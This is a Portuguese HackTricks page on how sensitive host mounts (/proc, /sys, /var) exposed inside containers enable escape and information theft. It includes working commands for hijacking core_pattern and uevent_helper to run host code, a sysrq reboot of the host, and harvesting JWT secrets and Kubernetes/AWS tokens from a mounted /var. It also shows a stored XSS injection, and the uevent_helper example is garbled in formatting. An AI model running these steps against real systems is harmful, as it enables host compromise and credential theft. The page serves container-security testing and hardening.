# Sensitive Mounts

{{#include ../../../../banners/hacktricks-training.md}}

A exposição de `/proc`, `/sys` e `/var` sem o devido isolamento de namespace introduz riscos de segurança significativos, incluindo aumento da superfície de ataque e divulgação de informações. Esses diretórios contêm arquivos sensíveis que, se mal configurados ou acessados por um usuário não autorizado, podem levar à fuga de contêiner, modificação do host ou fornecer informações que auxiliem ataques adicionais. Por exemplo, montar incorretamente `-v /proc:/host/proc` pode contornar a proteção do AppArmor devido à sua natureza baseada em caminho, deixando `/host/proc` desprotegido.

**Você pode encontrar mais detalhes sobre cada vulnerabilidade potencial em** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**

## Vulnerabilidades do procfs

### `/proc/sys`

Este diretório permite o acesso para modificar variáveis do kernel, geralmente via `sysctl(2)`, e contém várias subpastas de preocupação:

#### **`/proc/sys/kernel/core_pattern`**

- Descrito em [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
- Se você puder escrever dentro deste arquivo, é possível escrever um pipe `|` seguido pelo caminho para um programa ou script que será executado após uma falha.
- Um atacante pode encontrar o caminho dentro do host para seu contêiner executando `mount` e escrever o caminho para um binário dentro do sistema de arquivos de seu contêiner. Em seguida, causar uma falha em um programa para fazer o kernel executar o binário fora do contêiner.

- **Exemplo de Teste e Exploração**:
```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Test write access
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # Set custom handler
sleep 5 && ./crash & # Trigger handler
```
Verifique [este post](https://pwning.systems/posts/escaping-containers-for-fun/) para mais informações.

Exemplo de programa que trava:
```c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) {
buf[i] = 1;
}
return 0;
}
```
#### **`/proc/sys/kernel/modprobe`**

- Detalhado em [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- Contém o caminho para o carregador de módulos do kernel, invocado para carregar módulos do kernel.
- **Exemplo de Verificação de Acesso**:

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # Verificar acesso ao modprobe
```

#### **`/proc/sys/vm/panic_on_oom`**

- Referenciado em [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- Uma flag global que controla se o kernel entra em pânico ou invoca o OOM killer quando uma condição de OOM ocorre.

#### **`/proc/sys/fs`**

- De acordo com [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), contém opções e informações sobre o sistema de arquivos.
- O acesso de gravação pode permitir vários ataques de negação de serviço contra o host.

#### **`/proc/sys/fs/binfmt_misc`**

- Permite registrar interpretadores para formatos binários não nativos com base em seu número mágico.
- Pode levar à escalada de privilégios ou acesso ao shell root se `/proc/sys/fs/binfmt_misc/register` for gravável.
- Exploit relevante e explicação:
- [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
- Tutorial detalhado: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### Outros em `/proc`

#### **`/proc/config.gz`**

- Pode revelar a configuração do kernel se `CONFIG_IKCONFIG_PROC` estiver habilitado.
- Útil para atacantes identificarem vulnerabilidades no kernel em execução.

#### **`/proc/sysrq-trigger`**

- Permite invocar comandos Sysrq, potencialmente causando reinicializações imediatas do sistema ou outras ações críticas.
- **Exemplo de Reinicialização do Host**:

```bash
echo b > /proc/sysrq-trigger # Reinicializa o host
```

#### **`/proc/kmsg`**

- Expõe mensagens do buffer de anel do kernel.
- Pode ajudar em exploits de kernel, vazamentos de endereços e fornecer informações sensíveis do sistema.

#### **`/proc/kallsyms`**

- Lista símbolos exportados do kernel e seus endereços.
- Essencial para o desenvolvimento de exploits de kernel, especialmente para superar KASLR.
- As informações de endereço são restritas com `kptr_restrict` definido como `1` ou `2`.
- Detalhes em [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/[pid]/mem`**

- Interface com o dispositivo de memória do kernel `/dev/mem`.
- Historicamente vulnerável a ataques de escalada de privilégios.
- Mais em [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/kcore`**

- Representa a memória física do sistema no formato ELF core.
- A leitura pode vazar conteúdos de memória do sistema host e de outros contêineres.
- O grande tamanho do arquivo pode levar a problemas de leitura ou falhas de software.
- Uso detalhado em [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).

#### **`/proc/kmem`**

- Interface alternativa para `/dev/kmem`, representando a memória virtual do kernel.
- Permite leitura e gravação, portanto, modificação direta da memória do kernel.

#### **`/proc/mem`**

- Interface alternativa para `/dev/mem`, representando a memória física.
- Permite leitura e gravação, a modificação de toda a memória requer a resolução de endereços virtuais para físicos.

#### **`/proc/sched_debug`**

- Retorna informações de agendamento de processos, contornando as proteções do namespace PID.
- Expõe nomes de processos, IDs e identificadores de cgroup.

#### **`/proc/[pid]/mountinfo`**

- Fornece informações sobre pontos de montagem no namespace de montagem do processo.
- Expõe a localização do `rootfs` ou imagem do contêiner.

### Vulnerabilidades em `/sys`

#### **`/sys/kernel/uevent_helper`**

- Usado para manipular `uevents` de dispositivos do kernel.
- Gravar em `/sys/kernel/uevent_helper` pode executar scripts arbitrários ao serem acionados `uevent`.
- **Exemplo de Exploração**: %%%bash

#### Cria um payload

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

#### Encontra o caminho do host a partir do ponto de montagem do OverlayFS para o contêiner

host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)

#### Define uevent_helper para helper malicioso

echo "$host_path/evil-helper" > /sys/kernel/uevent_helper

#### Aciona um uevent

echo change > /sys/class/mem/null/uevent

#### Lê a saída

cat /output %%%

#### **`/sys/class/thermal`**

- Controla configurações de temperatura, potencialmente causando ataques de DoS ou danos físicos.

#### **`/sys/kernel/vmcoreinfo`**

- Vaza endereços do kernel, potencialmente comprometendo KASLR.

#### **`/sys/kernel/security`**

- Abriga a interface `securityfs`, permitindo a configuração de Módulos de Segurança do Linux como AppArmor.
- O acesso pode permitir que um contêiner desative seu sistema MAC.

#### **`/sys/firmware/efi/vars` e `/sys/firmware/efi/efivars`**

- Expõe interfaces para interagir com variáveis EFI na NVRAM.
- Configuração inadequada ou exploração pode levar a laptops brickados ou máquinas host não inicializáveis.

#### **`/sys/kernel/debug`**

- `debugfs` oferece uma interface de depuração "sem regras" para o kernel.
- Histórico de problemas de segurança devido à sua natureza irrestrita.

### Vulnerabilidades em `/var`

A pasta **/var** do host contém sockets de tempo de execução de contêiner e os sistemas de arquivos dos contêineres. Se esta pasta estiver montada dentro de um contêiner, esse contêiner terá acesso de leitura e gravação aos sistemas de arquivos de outros contêineres com privilégios de root. Isso pode ser abusado para pivotar entre contêineres, causar uma negação de serviço ou backdoor em outros contêineres e aplicativos que rodam neles.

#### Kubernetes

Se um contêiner como este for implantado com Kubernetes:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: pod-mounts-var
labels:
app: pentest
spec:
containers:
- name: pod-mounts-var-folder
image: alpine
volumeMounts:
- mountPath: /host-var
name: noderoot
command: [ "/bin/sh", "-c", "--" ]
args: [ "while true; do sleep 30; done;" ]
volumes:
- name: noderoot
hostPath:
path: /var
```
Dentro do **pod-mounts-var-folder** container:
```bash
/ # find /host-var/ -type f -iname '*.env*' 2>/dev/null

/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/201/fs/usr/src/app/.env.example
<SNIP>
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/135/fs/docker-entrypoint.d/15-local-resolvers.envsh

/ # cat /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/105/fs/usr/src/app/.env.example | grep -i secret
JWT_SECRET=85d<SNIP>a0
REFRESH_TOKEN_SECRET=14<SNIP>ea

/ # find /host-var/ -type f -iname 'index.html' 2>/dev/null
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/57/fs/usr/src/app/node_modules/@mapbox/node-pre-gyp/lib/util/nw-pre-gyp/index.html
<SNIP>
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/share/nginx/html/index.html
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/132/fs/usr/share/nginx/html/index.html

/ # echo '<!DOCTYPE html><html lang="en"><head><script>alert("Stored XSS!")</script></head></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/sh
are/nginx/html/index2.html
```
O XSS foi alcançado:

![Stored XSS via mounted /var folder](/images/stored-xss-via-mounted-var-folder.png)

Observe que o contêiner NÃO requer uma reinicialização ou qualquer coisa. Quaisquer alterações feitas através da pasta montada **/var** serão aplicadas instantaneamente.

Você também pode substituir arquivos de configuração, binários, serviços, arquivos de aplicativo e perfis de shell para alcançar RCE automático (ou semi-automático).

##### Acesso a credenciais de nuvem

O contêiner pode ler tokens de serviceaccount do K8s ou tokens de webidentity da AWS, o que permite que o contêiner obtenha acesso não autorizado ao K8s ou à nuvem:
```bash
/ # find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
/host-var/lib/kubelet/pods/21411f19-934c-489e-aa2c-4906f278431e/volumes/kubernetes.io~projected/kube-api-access-64jw2/..2025_01_22_12_37_42.4197672587/token
<SNIP>
/host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/kube-api-access-bljdj/..2025_01_22_12_17_53.265458487/token
/host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/aws-iam-token/..2025_01_22_03_45_56.2328221474/token
/host-var/lib/kubelet/pods/5fb6bd26-a6aa-40cc-abf7-ecbf18dde1f6/volumes/kubernetes.io~projected/kube-api-access-fm2t6/..2025_01_22_12_25_25.3018586444/token
```
#### Docker

A exploração no Docker (ou em implantações do Docker Compose) é exatamente a mesma, exceto que geralmente os sistemas de arquivos dos outros contêineres estão disponíveis sob um caminho base diferente:
```bash
$ docker info | grep -i 'docker root\|storage driver'
Storage Driver: overlay2
Docker Root Dir: /var/lib/docker
```
Os sistemas de arquivos estão sob `/var/lib/docker/overlay2/`:
```bash
$ sudo ls -la /var/lib/docker/overlay2

drwx--x---  4 root root  4096 Jan  9 22:14 00762bca8ea040b1bb28b61baed5704e013ab23a196f5fe4758dafb79dfafd5d
drwx--x---  4 root root  4096 Jan 11 17:00 03cdf4db9a6cc9f187cca6e98cd877d581f16b62d073010571e752c305719496
drwx--x---  4 root root  4096 Jan  9 21:23 049e02afb3f8dec80cb229719d9484aead269ae05afe81ee5880ccde2426ef4f
drwx--x---  4 root root  4096 Jan  9 21:22 062f14e5adbedce75cea699828e22657c8044cd22b68ff1bb152f1a3c8a377f2
<SNIP>
```
#### Nota

Os caminhos reais podem diferir em diferentes configurações, por isso sua melhor aposta é usar o comando **find** para localizar os sistemas de arquivos de outros contêineres e tokens de identidade SA / web.

### Referências

- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
- [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
- [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)

{{#include ../../../../banners/hacktricks-training.md}}
